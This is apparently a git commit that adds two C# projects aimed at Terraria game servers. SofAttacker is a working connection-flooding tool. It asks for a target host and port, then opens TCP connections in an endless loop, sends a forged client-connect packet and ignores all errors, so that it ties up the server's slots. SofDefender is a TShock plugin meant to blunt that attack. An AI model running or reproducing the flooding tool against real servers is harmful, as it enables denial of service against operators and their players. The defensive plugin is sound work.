06d78a41e45dadb64a08451b58d119f7f047eee7
Leader <3251263056@qq.com>
2022-08-25 23:33:14 +0800

    upload files

---
+++ SofAttacker/Program.cs
@@ -0,0 +1,64 @@
+﻿using System;
+using System.Collections.Generic;
+using System.IO;
+using System.Linq;
+using System.Net;
+using System.Net.Sockets;
+using System.Text;
+using System.Threading;
+using System.Threading.Tasks;
+
+namespace SofAttacker
+{
+    internal class Program
+    {
+        static void Main(string[] args)
+        {
+            //var pool = new ProxyPool();
+            //pool.GetProxysFromAPIs();
+            Console.WriteLine("Please enter the server address");
+            var addr = Console.ReadLine();
+            IPAddress path;
+            if (!IPAddress.TryParse(addr, out path))
+                path = Dns.GetHostEntry(addr).AddressList[0];
+            Console.WriteLine("Please enter the server port");
+            int port = int.Parse(Console.ReadLine());
+            Console.WriteLine("Send connect request?(yes/no)");
+            bool notSend = Console.ReadLine() == "no";
+            new Thread(() =>
+            {
+                while (true)
+                {
+                    try
+                    {
+                        var socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+                        //var socket = new TcpClient();
+                        //Utils.Connect(socket, new IPEndPoint(path.AddressList[0], port), new IPEndPoint(IPAddress.Parse("120.24.76.81"),8123));
+                        socket.Connect(new IPEndPoint(path, port));
+                        if (notSend)
+                            continue;
+                        {
+                            var data = new MemoryStream();
+                            using (BinaryWriter wr = new BinaryWriter(data))
+                            {
+                                wr.Write((short)0);
+                                wr.Write((byte)1);
+                                wr.Write("Terraria248");
+                                wr.BaseStream.Position = 0;
+                                wr.Write((short)wr.BaseStream.Length);
+                            }
+                            socket.Send(data.ToArray());
+                            var buffer = new byte[5];
+                            socket.Receive(buffer);
+                            Console.WriteLine(buffer[3]);
+                            Console.WriteLine("sent");
+                        }
+                    }
+                    catch { }
+                }
+            })
+            { IsBackground = true }.Start();
+            Console.ReadLine();
+        }
+    }
+}
---
+++ SofDefender/MainPlugin.cs
@@ -0,0 +1,52 @@
+﻿using OTAPI;
+using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using Terraria;
+using Terraria.Net.Sockets;
+using TerrariaApi.Server;
+using TShockAPI;
+
+namespace SofDefender
+{
+    [ApiVersion(2, 1)]
+    public class MainPlugin : TerrariaPlugin
+    {
+        public override string Name => "SofDefender";
+        public override string Description => "Defend the attack of sof";
+        public override string Author => "Leader";
+        public override Version Version => new Version(1, 0, 0, 0);
+        public MainPlugin(Main game) : base(game)
+        {
+        }
+
+        public override void Initialize()
+        {
+            ServerApi.Hooks.ServerJoin.Register(this, OnServerJoin);
+            Hooks.Net.Socket.Accepted += new Hooks.Net.Socket.AcceptedHandler(this.OnSocketAccpet);
+        }
+
+        List<ISocket> BlankClients = new List<ISocket>();
+
+        private HookResult OnSocketAccpet(ISocket client)
+        {
+            //the legnth of the buffer,it should be euqal to the hardware of your server.
+            if (BlankClients.Count > 20)
+            {
+                BlankClients[0].Close();
+                BlankClients.RemoveAt(0);
+            }
+            BlankClients.Add(client);
+            return HookResult.Cancel;
+        }
+
+
+        private void OnServerJoin(JoinEventArgs args)
+        {
+            int index = BlankClients.FindIndex(x => x.GetRemoteAddress() == Netplay.Clients[args.Who].Socket.GetRemoteAddress());
+            BlankClients.RemoveAt(index);
+        }
+    }
+}
